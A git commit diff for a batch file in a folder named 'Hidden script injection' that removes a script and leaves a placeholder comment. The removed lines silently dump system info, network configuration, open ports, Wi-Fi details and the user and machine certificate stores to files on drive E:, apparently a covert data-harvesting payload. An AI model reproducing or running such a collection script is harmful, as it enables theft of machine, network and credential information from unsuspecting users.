9d887c1dda1d0cee457e24f1e2e154eac8d3bda6
GuessMyHat <98121795+GuessMyHat@users.noreply.github.com>
2022-07-21 22:29:01 +0200

    Update b.bat

--- Users/Hidden script injection/b.bat
+++ Users/Hidden script injection/b.bat
@@ -1,9 +1,1 @@
-@echo off
-cd /D E:\output
-	systeminfo 1>&2> .\sysinfo.txt
-	ipconfig /all 1>&2> .\ipconfig.txt
-	netstat -nao 1>&2> .\hostports.txt;
-	netsh wlan show all 1>&2> .\wlanstat.txt;
-	certutil -store -user -silent my 1>&2> .\certificates.txt;
-	certutil -store -silent my 1>>&2>> .\certificates.txt
-exit
+REM Write your code here.
